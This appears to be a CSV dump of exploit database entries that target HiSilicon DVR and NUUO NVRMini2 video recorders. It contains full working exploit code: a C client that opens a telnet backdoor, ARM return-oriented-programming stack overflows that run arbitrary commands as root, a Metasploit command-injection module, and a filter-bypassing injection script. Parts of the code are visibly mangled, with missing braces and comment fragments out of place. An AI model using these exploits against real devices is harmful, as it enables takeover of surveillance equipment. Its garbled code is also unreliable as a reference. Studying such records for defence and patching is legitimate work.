2020-02-05,Remote,Hardware,Snawoot,HiSilicon DVR/NVR hi3520d firmware,Remote Backdoor Account,"# Exploit Title: HiSilicon DVR/NVR hi3520d firmware - Remote Backdoor Account
# Dork: N/A
# Date: 2020-02-03
# Exploit Author: Snawoot
# Vendor Homepage: http://www.hisilicon.com
# Product Link: http://www.hisilicon.com/en/Products
# Version: hi3520d
# Tested on: Linux
# CVE: N/A
# References: https://habr.com/en/post/486856/
# References: https://github.com/Snawoot/hisilicon-dvr-telnet
# References: https://github.com/tothi/pwn-hisilicon-dvr#summary
# POC:
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
/* Better to truncate output string than overflow buffer */
/* it would be still better to either return a status */
/* or ensure the target buffer is large enough and it never happen */
#define PADDED(X) (((X + 7) / 8) * 8)
#define PORT 9530
#define BUFSIZE sizeof(netbuf)
#define CMD_FIRST ""OpenTelnet:OpenOnce""
#define CHALLENGE_PROLOGUE ""randNum:""
#define VERIFY_OK ""verify:OK""
#define CMD_FINAL ""CMD:""
#define FINAL_PAYLOAD ""Telnet:OpenOnce""
#define OPEN_OK ""Open:OK""","typedef unsigned char byte;
typedef unsigned int uint;
byte state[2048] = {0};
byte datum[] = {
0x20, 0x01, 0x02, 0x03, 0x04, 0x05, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11,
0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19,
0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1c, 0x1d, 0x1e, 0x1f, 0x20, 0x01,
0x0e, 0x04, 0x0d, 0x01, 0x02, 0x0f, 0x0b, 0x08, 0x03, 0x0a, 0x06, 0x0c,
0x05, 0x09, 0x00, 0x07, 0x00, 0x0f, 0x07, 0x04, 0x0e, 0x02, 0x0d, 0x01,
0x0a, 0x06, 0x0c, 0x0b, 0x09, 0x05, 0x03, 0x08, 0x04, 0x01, 0x0e, 0x08,
0x0d, 0x06, 0x02, 0x0b, 0x0f, 0x0c, 0x09, 0x07, 0x03, 0x0a, 0x05, 0x00,
0x0f, 0x0c, 0x08, 0x02, 0x04, 0x09, 0x01, 0x07, 0x05, 0x0b, 0x03, 0x0e,
0x0a, 0x00, 0x06, 0x0d, 0x0f, 0x01, 0x08, 0x0e, 0x06, 0x0b, 0x03, 0x04,
0x09, 0x07, 0x02, 0x0d, 0x0c, 0x00, 0x05, 0x0a, 0x03, 0x0d, 0x04, 0x07,
0x0f, 0x02, 0x08, 0x0e, 0x0c, 0x00, 0x01, 0x0a, 0x06, 0x09, 0x0b, 0x05,
0x00, 0x0e, 0x07, 0x0b, 0x0a, 0x04, 0x0d, 0x01, 0x05, 0x08, 0x0c, 0x06,
0x09, 0x03, 0x02, 0x0f, 0x0d, 0x08, 0x0a, 0x01, 0x03, 0x0f, 0x04, 0x02,
0x0b, 0x06, 0x07, 0x0c, 0x00, 0x05, 0x0e, 0x09, 0x0a, 0x00, 0x09, 0x0e,
0x06, 0x03, 0x0f, 0x05, 0x01, 0x0d, 0x0c, 0x07, 0x0b, 0x04, 0x02, 0x08,
0x0d, 0x07, 0x00, 0x09, 0x03, 0x04, 0x06, 0x0a, 0x02, 0x08, 0x05, 0x0e,
0x0c, 0x0b, 0x0f, 0x01, 0x0d, 0x06, 0x04, 0x09, 0x08, 0x0f, 0x03, 0x00,
0x0b, 0x01, 0x02, 0x0c, 0x05, 0x0a, 0x0e, 0x07, 0x01, 0x0a, 0x0d, 0x00,
0x06, 0x09, 0x08, 0x07, 0x04, 0x0f, 0x0e, 0x03, 0x0b, 0x05, 0x02, 0x0c,
0x07, 0x0d, 0x0e, 0x03, 0x00, 0x06, 0x09, 0x0a, 0x01, 0x02, 0x08, 0x05,
0x0b, 0x0c, 0x04, 0x0f, 0x0d, 0x08, 0x0b, 0x05, 0x06, 0x0f, 0x00, 0x03,
0x04, 0x07, 0x02, 0x0c, 0x01, 0x0a, 0x0e, 0x09, 0x0a, 0x06, 0x09, 0x00,
0x0c, 0x0b, 0x07, 0x0d, 0x0f, 0x01, 0x03, 0x0e, 0x05, 0x02, 0x08, 0x04,
0x03, 0x0f, 0x00, 0x06, 0x0a, 0x01, 0x0d, 0x08, 0x09, 0x04, 0x05, 0x0b,
0x0c, 0x07, 0x02, 0x0e, 0x02, 0x0c, 0x04, 0x01, 0x07, 0x0a, 0x0b, 0x06,
0x08, 0x05, 0x03, 0x0f, 0x0d, 0x00, 0x0e, 0x09, 0x0e, 0x0b, 0x02, 0x0c,
0x04, 0x07, 0x0d, 0x01, 0x05, 0x00, 0x0f, 0x0a, 0x03, 0x09, 0x08, 0x06,
0x04, 0x02, 0x01, 0x0b, 0x0a, 0x0d, 0x07, 0x08, 0x0f, 0x09, 0x0c, 0x05,
0x06, 0x03, 0x00, 0x0e, 0x0b, 0x08, 0x0c, 0x07, 0x01, 0x0e, 0x02, 0x0d,
0x06, 0x0f, 0x00, 0x09, 0x0a, 0x04, 0x05, 0x03, 0x0c, 0x01, 0x0a, 0x0f,
0x09, 0x02, 0x06, 0x08, 0x00, 0x0d, 0x03, 0x04, 0x0e, 0x07, 0x05, 0x0b,
0x0a, 0x0f, 0x04, 0x02, 0x07, 0x0c, 0x09, 0x05, 0x06, 0x01, 0x0d, 0x0e,
0x00, 0x0b, 0x03, 0x08, 0x09, 0x0e, 0x0f, 0x05, 0x02, 0x08, 0x0c, 0x03,
0x07, 0x00, 0x04, 0x0a, 0x01, 0x0d, 0x0b, 0x06, 0x04, 0x03, 0x02, 0x0c,
0x09, 0x05, 0x0f, 0x0a, 0x0b, 0x0e, 0x01, 0x07, 0x06, 0x00, 0x08, 0x0d,
0x04, 0x0b, 0x02, 0x0e, 0x0f, 0x00, 0x08, 0x0d, 0x03, 0x0c, 0x09, 0x07,
0x05, 0x0a, 0x06, 0x01, 0x0d, 0x00, 0x0b, 0x07, 0x04, 0x09, 0x01, 0x0a,
0x0e, 0x03, 0x05, 0x0c, 0x02, 0x0f, 0x08, 0x06, 0x01, 0x04, 0x0b, 0x0d,
0x0c, 0x03, 0x07, 0x0e, 0x0a, 0x0f, 0x06, 0x08, 0x00, 0x05, 0x09, 0x02,
0x06, 0x0b, 0x0d, 0x08, 0x01, 0x04, 0x0a, 0x07, 0x09, 0x05, 0x00, 0x0f,
0x0e, 0x02, 0x03, 0x0c, 0x0d, 0x02, 0x08, 0x04, 0x06, 0x0f, 0x0b, 0x01,
0x0a, 0x09, 0x03, 0x0e, 0x05, 0x00, 0x0c, 0x07, 0x01, 0x0f, 0x0d, 0x08,
0x0a, 0x03, 0x07, 0x04, 0x0c, 0x05, 0x06, 0x0b, 0x00, 0x0e, 0x09, 0x02,
0x07, 0x0b, 0x04, 0x01, 0x09, 0x0c, 0x0e, 0x02, 0x00, 0x06, 0x0a, 0x0d,
0x0f, 0x03, 0x05, 0x08, 0x02, 0x01, 0x0e, 0x07, 0x04, 0x0a, 0x08, 0x0d,
0x0f, 0x0c, 0x09, 0x00, 0x03, 0x05, 0x06, 0x0b, 0x10, 0x07, 0x14, 0x15,
0x1d, 0x0c, 0x1c, 0x11, 0x01, 0x0f, 0x17, 0x1a, 0x05, 0x12, 0x1f, 0x0a,
0x02, 0x08, 0x18, 0x0e, 0x20, 0x1b, 0x03, 0x09, 0x13, 0x0d, 0x1e, 0x06,
0x16, 0x0b, 0x04, 0x19, 0x3a, 0x32, 0x2a, 0x22, 0x1a, 0x12, 0x0a, 0x02,
0x3c, 0x34, 0x2c, 0x24, 0x1c, 0x14, 0x0c, 0x04, 0x3e, 0x36, 0x2e, 0x26,
0x1e, 0x16, 0x0e, 0x06, 0x40, 0x38, 0x30, 0x28, 0x20, 0x18, 0x10, 0x08,
0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01, 0x3b, 0x33, 0x2b, 0x23,
0x1b, 0x13, 0x0b, 0x03, 0x3d, 0x35, 0x2d, 0x25, 0x1d, 0x15, 0x0d, 0x05,
0x3f, 0x37, 0x2f, 0x27, 0x1f, 0x17, 0x0f, 0x07, 0xf4, 0x63, 0x01, 0x00,
0x28, 0x08, 0x30, 0x10, 0x38, 0x18, 0x40, 0x20, 0x27, 0x07, 0x2f, 0x0f,
0x37, 0x17, 0x3f, 0x1f, 0x26, 0x06, 0x2e, 0x0e, 0x36, 0x16, 0x3e, 0x1e,
0x25, 0x05, 0x2d, 0x0d, 0x35, 0x15, 0x3d, 0x1d, 0x24, 0x04, 0x2c, 0x0c,
0x34, 0x14, 0x3c, 0x1c, 0x23, 0x03, 0x2b, 0x0b, 0x33, 0x13, 0x3b, 0x1b,
0x22, 0x02, 0x2a, 0x0a, 0x32, 0x12, 0x3a, 0x1a, 0x21, 0x01, 0x29, 0x09,
0x31, 0x11, 0x39, 0x19, 0x39, 0x31, 0x29, 0x21, 0x19, 0x11, 0x09, 0x01,
0x3a, 0x32, 0x2a, 0x22, 0x1a, 0x12, 0x0a, 0x02, 0x3b, 0x33, 0x2b, 0x23,
0x1b, 0x13, 0x0b, 0x03, 0x3c, 0x34, 0x2c, 0x24, 0x3f, 0x37, 0x2f, 0x27,
0x1f, 0x17, 0x0f, 0x07, 0x3e, 0x36, 0x2e, 0x26, 0x1e, 0x16, 0x0e, 0x06,
0x3d, 0x35, 0x2d, 0x25, 0x1d, 0x15, 0x0d, 0x05, 0x1c, 0x14, 0x0c, 0x04,
0x50, 0x64, 0x01, 0x00, 0x01, 0x01, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02,
0x01, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x01, 0x0e, 0x11, 0x0b, 0x18,
0x01, 0x05, 0x03, 0x1c, 0x0f, 0x06, 0x15, 0x0a, 0x17, 0x13, 0x0c, 0x04,
0x1a, 0x08, 0x10, 0x07, 0x1b, 0x14, 0x0d, 0x02, 0x29, 0x34, 0x1f, 0x25,
0x2f, 0x37, 0x1e, 0x28, 0x33, 0x2d, 0x21, 0x30, 0x2c, 0x31, 0x27, 0x38,
0x22, 0x35, 0x2e, 0x2a, 0x32, 0x24, 0x1d, 0x20
void init_cipher_offset_vector(byte *dst,byte *src,int size)
int i;
i = 0;
while (i < size) {
dst[i] = (byte)((int)(uint)src[i >> 3] >> (i & 7U)) & 1;
i = i + 1;
return;
void apply_cipher_offset_vector(byte *dst,byte *src,byte *offset_vector,size_t size)
int i;
i = 0;
while (i < (int)size) {
state[i] = src[(uint)offset_vector[i] - 1];
i = i + 1;
memcpy(dst,state,size);
return;
void cipher_memcpy_shuffle(void *dst,size_t size)
memcpy(state,dst,size);
memcpy(dst,(void *)(dst + size),0x1c - size);
memcpy((void *)(dst + (0x1c - size)),state,size);
return;
void init_cipher_state(void *dst,void *src)
byte current_byte;
int i;
init_cipher_offset_vector(state + 0x190,(byte *)src,0x40);
apply_cipher_offset_vector(state + 0x190,state + 0x190,datum + 0x2d4,0x38);
i = 0;
do {
current_byte = (datum + 0x310)[i];
i = i + 1;
cipher_memcpy_shuffle(state + 0x190,(uint)current_byte);
cipher_memcpy_shuffle(state + 0x190 + 0x1c,(uint)current_byte);
apply_cipher_offset_vector((byte *)dst,state + 0x190,datum + 0x320,0x30);
dst = (byte *)dst + 0x30;
} while (i != 0x10);
return;
void cipher_xor(byte *data,byte *key,int size)
int i;
i = 0;
while (i < size) {
data[i] = key[i] ^ data[i];
i = i + 1;
return;
void prepare_key(void *key,size_t key_size)
size_t __n;
memset(state + 0x1d0,0,0x10);
__n = key_size;
if (0xf < (int)key_size) {
__n = 0x10;
memcpy(state + 0x1d0,key,__n);
init_cipher_state(state + 0x1e0,state + 0x1d0);
if (8 < (int)key_size) {
init_cipher_state(state + 0x4e0,state + 0x1d8);
*(state + 0x7e0) = 8 < (int)key_size; // !!!! recheck size
return;
void cipher_shuffle(byte *dst,byte *src)
byte *caretPtr;
int iVar1;
byte *ptr;
int i;
apply_cipher_offset_vector(state + 0x100,dst,datum,0x30);
cipher_xor(state + 0x100,src,0x30);
ptr = state + 0x100;
i = 0;
do {
iVar1 = i + (uint)ptr[5] + (uint)*ptr * 2;
caretPtr = dst + i;
i = i + 4;
init_cipher_offset_vector
(caretPtr,datum + 0x30 +
(uint)ptr[2] * 4 + (uint)ptr[1] * 8 + (uint)ptr[4] + (uint)ptr[3] * 2 +
iVar1 * 0x10,4);
ptr = ptr + 6;
} while (i != 0x20);
apply_cipher_offset_vector(dst,dst,datum + 0x230,0x20);
return;
void cipher_box(byte *result,byte *data,byte *offset_vector,int direction)
uint i;
byte *backward_ov_ptr;
byte *forward_ov_ptr;
int iVar3;
init_cipher_offset_vector(state + 0x130,data,0x40);
apply_cipher_offset_vector(state + 0x130,state + 0x130,datum + 0x250,0x40);
if (direction == 0) {
forward_ov_ptr = offset_vector + 0x300;
do {
memcpy(state + 0x170,state + 0x150,0x20);
cipher_shuffle(state + 0x150,offset_vector);
cipher_xor(state + 0x150,state + 0x130,0x20);
memcpy(state + 0x130, state + 0x170, 0x20);
offset_vector = offset_vector + 0x30;
} while (offset_vector != forward_ov_ptr);
else {
backward_ov_ptr = offset_vector + 0x2d0;
do {
memcpy(state + 0x170,state + 0x130,0x20);
cipher_shuffle(state + 0x130,backward_ov_ptr);
cipher_xor(state + 0x130,state + 0x150,0x20);
backward_ov_ptr -= 0x30;
memcpy(state + 0x150,state + 0x170,0x20);
} while (backward_ov_ptr != offset_vector + -0x30);
apply_cipher_offset_vector(state + 0x130,state + 0x130,datum + 0x294,0x40);
memset(result,0,8);
i = 0;
do {
result[i >> 3] = result[i >> 3] | *(char *)(state + 0x130 + i) << (i & 7);
i = i + 1;
} while (i != 0x40);
return;
int decrypt(char *result,char *data,uint data_len,char *key,uint key_len)
uint short_key_iter;
int curBlockNumber;
int blockCount;
if (((result != (char *)0x0 && data != (char *)0x0) && (curBlockNumber = 0, key != (char *)0x0))
&& ((data_len + 7 & 0xfffffff8) != 0)) {
prepare_key(key,key_len);
blockCount = (int)(data_len + 7) >> 3;
short_key_iter = *(state + 0x7e0);
if (*(state + 0x7e0) == 0) {
while ((int)short_key_iter < blockCount) {
cipher_box((byte *)result,(byte *)data,state + 0x1e0,1);
short_key_iter = short_key_iter + 1;
result = (char *)((byte *)result + 8);
data = (char *)((byte *)data + 8);
else {
while (curBlockNumber < blockCount) {
cipher_box((byte *)result,(byte *)data,state + 0x1e0,1);
cipher_box((byte *)result,(byte *)result,state + 0x4e0,0);
cipher_box((byte *)result,(byte *)result,state + 0x1e0,1);
curBlockNumber = curBlockNumber + 1;
result = (char *)((byte *)result + 8);
data = (char *)((byte *)data + 8);
return 0;
return -1;
int encrypt(char *result,char *data,uint data_len,char *key,uint key_size)
uint uVar2;
int currentBlockNumber;
int blocksCount;
if (((result != (char *)0x0 && data != (char *)0x0) &&
(currentBlockNumber = 0, key != (char *)0x0)) && ((data_len + 7 & 0xfffffff8) != 0)) {
prepare_key(key,key_size);
blocksCount = (int)(data_len + 7) >> 3;
uVar2 = *(state + 0x7e0);
if (*(state + 0x7e0) == 0) {
while ((int)uVar2 < blocksCount) {
cipher_box((byte *)result,(byte *)data,state + 0x1e0,0);
uVar2 = uVar2 + 1;
result = (char *)((byte *)result + 8);
data = (char *)((byte *)data + 8);
else {
while (currentBlockNumber < blocksCount) {
cipher_box((byte *)result,(byte *)data,state + 0x1e0,0);
cipher_box((byte *)result,(byte *)result,state + 0x4e0,1);
cipher_box((byte *)result,(byte *)result,state + 0x1e0,0);
currentBlockNumber = currentBlockNumber + 1;
result = (char *)((byte *)result + 8);
data = (char *)((byte *)data + 8);
return 0;
return -1;
void tohex(unsigned char * in, size_t insz, char * out, size_t outsz)
unsigned char * pin = in;
const char * hex = ""0123456789ABCDEF"";
char * pout = out;
for(; pin < in+insz; pout +=3, pin++){
pout[0] = hex[(*pin>>4) & 0xF];
pout[1] = hex[ *pin     & 0xF];
pout[2] = ':';
if (pout + 3 - out > outsz){
break;
pout[-1] = 0;
char netbuf[4096];
ssize_t send_str(int sockfd, char *str, size_t len) {
if (len > 0xFE) {
return -1;
char buf[len+1];
buf[0] = len + 1;
memcpy(buf + 1, str, len);
return send(sockfd, buf, len + 1, 0);
int main(int argc, char* argv[]) {
int sockfd, numbytes;
struct hostent *he;
struct sockaddr_in their_addr;
if (argc != 3) {
fprintf(stderr, ""Usage: %s <host> <PSK>\n"", argv[0]);
return 2;
if ((he=gethostbyname(argv[1])) == NULL) {  /* get the host info */
herror(""gethostbyname"");
return 1;
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
perror(""socket"");
return 1;
their_addr.sin_family = AF_INET;      /* host byte order */
their_addr.sin_port = htons(PORT);    /* short, network byte order */
their_addr.sin_addr = *((struct in_addr *)he->h_addr);
bzero(&(their_addr.sin_zero), 8);     /* zero the rest of the struct */
if (connect(sockfd, (struct sockaddr *)&their_addr, \
sizeof(struct sockaddr)) == -1) {
perror(""connect"");
return 1;
if (send_str(sockfd, CMD_FIRST, sizeof(CMD_FIRST)) == -1) {
perror(""send"");
return 1;
printf(""Sent %s command.\n"", CMD_FIRST);
bzero(netbuf, BUFSIZE);
if ((numbytes=recv(sockfd, netbuf, BUFSIZE - 1, 0)) == -1) {
perror(""recv"");
return 1;
puts(netbuf);
if (memcmp(netbuf, CHALLENGE_PROLOGUE, sizeof(CHALLENGE_PROLOGUE) - 1) != 0) {
fprintf(stderr, ""No challenge received.\n"");
return 3;
char *seed = netbuf + sizeof(CHALLENGE_PROLOGUE) - 1;
char challengeStr[strlen(seed) + strlen(argv[2]) + 1];
size_t challengeLen = sprintf(challengeStr, ""%s%s"", seed, argv[2]);
printf(""challenge=%s\n"", challengeStr);
char encryptedRandomSeed[PADDED(challengeLen)];
encrypt(encryptedRandomSeed, seed, strlen(seed), challengeStr, challengeLen);
memcpy(netbuf, CHALLENGE_PROLOGUE, sizeof(CHALLENGE_PROLOGUE) - 1);
memcpy(netbuf + sizeof(CHALLENGE_PROLOGUE) - 1, encryptedRandomSeed, PADDED(challengeLen));
if (send_str(sockfd, netbuf, sizeof(CHALLENGE_PROLOGUE) - 1 + PADDED(challengeLen)) == -1) {
perror(""send"");
return 1;
bzero(netbuf, BUFSIZE);
if ((numbytes=recv(sockfd, netbuf, BUFSIZE - 1, 0)) == -1) {
perror(""recv"");
return 1;
puts(netbuf);
if (memcmp(netbuf, VERIFY_OK, sizeof(VERIFY_OK) - 1) != 0) {
fprintf(stderr, ""Verification failed.\n"");
return 4;
char encryptedFinal[PADDED(sizeof(FINAL_PAYLOAD))];
encrypt(encryptedFinal, FINAL_PAYLOAD, sizeof(FINAL_PAYLOAD), challengeStr, challengeLen);
memcpy(netbuf, CMD_FINAL, sizeof(CMD_FINAL) - 1);
memcpy(netbuf + sizeof(CMD_FINAL) - 1, encryptedFinal, sizeof(encryptedFinal));
if (send_str(sockfd, netbuf, sizeof(CMD_FINAL) - 1 + sizeof(encryptedFinal)) == -1) {
perror(""send"");
return 1;
bzero(netbuf, BUFSIZE);
if ((numbytes=recv(sockfd, netbuf, BUFSIZE - 1, 0)) == -1) {
perror(""recv"");
return 1;
puts(netbuf);
if (memcmp(netbuf, OPEN_OK, sizeof(OPEN_OK) - 1)) {
fprintf(stderr, ""Open failed.\n"");
return 5;
return 0;"
2019-06-04,Remote,Hardware,@0x00string,NUUO NVRMini 2 3.9.1,'sscanf' Stack Overflow,"#!/usr/bin/python
# Exploit Title: NUUO NVRMini2 3.9.1 'sscanf' stack overflow
# Google Dork: n/a
# Date: Advisory Published: Nov 18
# Exploit Author: @0x00string
# Vendor Homepage: nuuo.com
# Software Link: https://www.nuuo.com/ProductNode.php?node=2
# Version: 3.9.1 and prior
# Tested on: 3.9.1
# CVE : CVE-2018-19864
#   [ leading / ]
#   [ Padding x 335 ]
#   [ original value at stack pointer + 158 ]
#   [ padding x 80 ]
#   [ address of (pop {r3,lr} ; bx lr) ]
#   [ system() address ]
#   [ address of (mov r0,sp ; blx r3) ]
#   [ command to execute ]
https://github.com/0x00string/oldays/blob/master/CVE-2018-19864.py","def banner():
print '''
@0x00string
0000000000000
0000000000000000000   00
00000000000000000000000000000
0000000000000000000000000000000
000000000             0000000000
00000000               0000000000
0000000                000000000000
0000000               000000000000000
000000              000000000  000000
0000000            000000000     000000
000000            000000000      000000
000000          000000000        000000
000000         00000000          000000
000000       000000000           000000
0000000    000000000            0000000
000000   000000000             000000
0000000000000000              0000000
0000000000000               0000000
00000000000              00000000
00000000000            000000000
0000000000000000000000000000000
00000000000000000000000000000
000  0000000000000000000
0000000000000
def usage ():
print   (""python script.py <args>\n""
""   -h, --help:             Show this message\n""
""   -a, --rhost:            Target IP address\n""
""   -b, --rport:            Target Port - default 5150\n""
""   -c, --command:          Command to execute\n""
""\n""
""Example:\n""
""python script.py -a 10.10.10.10\n""
""python script.py -a 10.10.10.10 -b 1234 -c reboot\n"")
exit()
def main():
rhost = None;
rport = ""5150"";
command = ""{/bin/touch,/tmp/hax}""
banner()
options, remainder = getopt.getopt(sys.argv[1:], 'a:b:c:fh', ['rhost=','rport=','command=','help'])
for opt, arg in options:
if opt in ('-h', '--help'):
usage()
elif opt in ('-a','--rhost'):
rhost = arg;
elif opt in ('-b','--rport'):
rport = arg;
elif opt in ('-c','--command'):
command = arg;
print (""Sending exploit to execute ["" + command + ""]\n"")
buf = ""GET /"" + (""Z"" * 335) + ""\x30\x2a\x17\x45"" + (""Y"" * 80) + ""\x08\xfc\x78\x40"" +
""\x44\xe0\x17\x40"" + ""\xcc\xb7\x77\x40"" + command + "" HTTP/1.1\r\nHost: "" +
""http://"" + rhost + "":"" + rport + ""\r\n\r\n""
sock = socket(AF_INET, SOCK_STREAM)
sock.settimeout(30)
sock.connect((target_ip,int(target_port)))
sock.send(buf)
print (""done\n"")
if __name__ == ""__main__"":
main()"
2019-02-11,Remote,PHP,Metasploit,NUUO NVRmini,upgrade_handle.php Remote Command Execution (Metasploit),"# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework","class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
def initialize(info={})
super(update_info(info,
'Name'        => 'NUUO NVRmini upgrade_handle.php Remote Command Execution',
'Description' => %q{
This exploits a vulnerability in the web application of NUUO NVRmini IP camera,
which can be done by triggering the writeuploaddir command in the upgrade_handle.php file.
'License' => MSF_LICENSE,
'Author'  =>
'Berk Dusunur', # @berkdusunur
'numan turle'   # @numanturle
'References' =>
['URL', 'https://www.berkdusunur.net/2018/11/development-of-metasploit-module-after.html'],
['URL', 'https://www.tenable.com/security/research/tra-2018-41'],
['CVE', '2018-14933'],
['EDB', '45070']
'Privileged'   => false,
'Payload'      =>
'DisableNops' => true
'Platform'       => %w{ unix win linux },
'Arch'           => ARCH_CMD,
'Targets'        => [ ['NUUO NVRmini', { }], ],
'DisclosureDate' => 'Aug 04 2018',
'DefaultTarget'  => 0))
end
def check
res = send_request_cgi({
'uri' => normalize_uri(target_uri.path, 'upgrade_handle.php'),
'vars_get' =>
'cmd' => 'writeuploaddir',
'uploaddir' => ""';echo '#{Rex::Text.rand_text_alphanumeric(10..15)}';'""
unless res
vprint_error 'Connection failed'
return CheckCode::Unknown
end
if res.code == 200 && res.body =~ /upload_tmp_dir/
return CheckCode::Vulnerable
end
CheckCode::Safe
end
def http_send_command(cmd)
uri = normalize_uri(target_uri.path.to_s, ""upgrade_handle.php"")
res = send_request_cgi({
'method'   => 'GET',
'uri'      =>  uri,
'vars_get' =>
'cmd' => 'writeuploaddir',
'uploaddir' => ""';""+cmd+"";'""
unless res
fail_with(Failure::Unknown, 'Failed to execute the command.')
end
res
end
def exploit
http_send_command(payload.encoded)
end
end"
2018-12-04,WebApps,PHP,Artem Metla,NUUO NVRMini2 3.9.1,(Authenticated) Command Injection,"# Exploit Title: NUUO NVRMini2 Authenticated Command Injection
# Date: December 3, 2018
# Exploit Author: Artem Metla
# Vendor Homepage: https://www.nuuo.com/ProductNode.php?node=2#
# Version: 3.9.1
# Tested on: NUUO NVRMini2 with firmware 3.9.1
# CVE : CVE-2018-15716
# Advisory: https://www.tenable.com/security/research/tra-2018-41
# Step 1. Authentication
# Step 2. Prepare a payload
# We're bypassing 2 filters:
# 1) Instead of using "";"" we can try || or &&, to bypass:
#    if(strpos($uploaddir, ';') !== false)
#    {
#      die('[1]Not a valid path.');
#    }
# 2) To bypass this:
#    $cmd = ""sed -i 's/"".str_replace('/', '\/',
#    we have to HEX encode a payload
#    Simple example of payload that we're trying to achieve: '||ls`echo
# 3) Multiple parameters commands are not supported yet, but the same
# Primitive Bash command parser
# Encoding a payload
# Step 3. Send a payload
# Step 4. Output processing to grab only needed output
# Adds arguments to help menu
# Assigns the arguments to various variables
# Main","import argparse
import requests
import urllib.parse
import binascii
import http.cookiejar as cookielib
import re
def run(target, username, password, command):
"""""" Authenticate us and execute exploitation """"""
payload = {'language':'en', 'user':username, 'pass':password,
'submit':'Login'}
r = requests.post(urllib.parse.urljoin(target, 'login.php'),
data=payload, verify=False, allow_redirects=False)
jar = r.cookies
$current_dir).""/"".str_replace('/', '\/', $tmp_upload_dir).""/g'
"".PHP_CINF_PATH;
-e ""\\x20\\x2f""`||' to execue: ls /
techique could be used for them
splitted_command = [command]
for i in range(0, len(command)-1):
if command[i] == "" "" and command[i+1] != ""-"":
splitted_command = [command[:i], command[i+1:]]
break
if len(splitted_command) == 2:
payload = """".join('\\\\x%s' %
binascii.hexlify(char.encode('ascii')).decode(""utf-8"") for char in
splitted_command[1])
exploit = '\'||%s `echo -e ""%s""`||\'' % (splitted_command[0],
payload)
print(""Exploit: %s"" % exploit)
else:
exploit = '\'||%s||\'' % (splitted_command[0])
print(""Exploit: %s"" % exploit)
payload = {'cmd':'writeuploaddir', 'uploaddir':exploit}
r = requests.get(urllib.parse.urljoin(target, 'upgrade_handle.php'),
params=payload, verify=False, cookies=jar)
res = re.search('upload_tmp_dir=([^<>]*)<br />', str(r.content))
if res:
print(res.group(1).replace('\\n', '\n'))
def main():
"""""" Parse command line arguments and start exploit """"""
parser = argparse.ArgumentParser(
add_help=False,
formatter_class=argparse.RawDescriptionHelpFormatter,
epilog=""Examples: %(prog)s -t http://192.168.0.1/ -u username
-p password -c whoami"")
parser.add_argument(""-h"", action=""help"", help=""Print this help message
then exit"")
parser.add_argument(""-t"", dest=""target"", required=""yes"", help=""Target
URL address like: https://localhost:443/"")
parser.add_argument(""-u"", dest=""username"", required=""yes"",
help=""Username to authenticate"")
parser.add_argument(""-p"", dest=""password"", required=""yes"",
help=""Password to authenticate"")
parser.add_argument(""-c"", dest=""command"", required=""yes"", help=""Shell
command to execute"")
args = parser.parse_args()
run(args.target, args.username, args.password, args.command)
if __name__ == ""__main__"":
main()"
2018-09-18,Remote,Hardware,Jacob Baines,NUUO NVRMini2 3.8,'cgi_system' Buffer Overflow (Enable Telnet),"# Exploit Title: NUUO NVRMini2 3.8 - 'cgi_system' Buffer Overflow (Enable Telnet)
# Date: 2018-09-17
# Exploit Author: Jacob Baines
# Vendor Homepage: https://www.nuuo.com/
# Device: NRVMini2
# Software Link: https://www.nuuo.com/ProductNode.php?node=2
# Versions: 3.8.0 and below
# Tested Against: 03.07.0000.0011 and 03.08.0000.0005
# Tested on: Ubuntu and OSX
# CVE: N/A
# TRA: https://www.tenable.com/security/research/tra-2018-25
# Description:
# A stack buffer overflow exists in the cgi_system binary. The error occurs
# due to lack of bounds checking on the PHPSESSID value before and when
# it is passed to sprintf in order to generate the session id file name.
# As written, this exploit enables Telnet.
# Executes a command via the stack buffer overflow in cookie parsing. The command
# is executed via 'system' as root. The overlow logic is like so:
# address 1: 405e2e34 - load system into r3 and address 2 into lr
# .text:000D0E34 0F 48 BD E8                 LDMFD   SP!, {R0-R3,R11,LR}
# .text:000D0E38 1E FF 2F E1                 BX      LR
# address 2: 406037cc - load the system command into r0. Jump to system.
# .text:000F17CC 0D 00 A0 E1                 MOV     R0, SP
# .text:000F17D0 33 FF 2F E1                 BLX     R3
# [   address 1  ][       r0     ][      r1      ][      r2      ][  r3 system   ][      r11     ][  LR - addr2  ][ system command ]
# \x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40touch /tmp/lolwat
# PoC
# We should get a 500 Internal error in response
# Quickly tries to grab the version of the target. If the target is
# using anything other than 3.7 or 3.8 then we'll bail out since
# haven't tested on any other targets","import requests
import socket
import sys
def stack_buffer_overflow(command, ip, port):
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print '[+] Executing %s on %s:%s...' % (command, ip, port)
sock.connect((ip, int(port)))
exec_request = ('GET /cgi-bin/cgi_system?cmd=portCheck HTTP/1.1\r\n' +
'Host: ' + ip + ':' + port + '\r\n' +
'Accept: */*\r\n' +
'Cookie: PHPSESSID=982e6c010064b3878a4b793bfab8d2d2' +
'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDD' +
'\x34\x2e\x5e\x40\xaa\xaa\xaa\xaa\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\xfc\xbf\x54\x40\xee\xee\xee\xee\xcc\x37\x60\x40' + command +
'\r\n\r\n')
sock.sendall(exec_request)
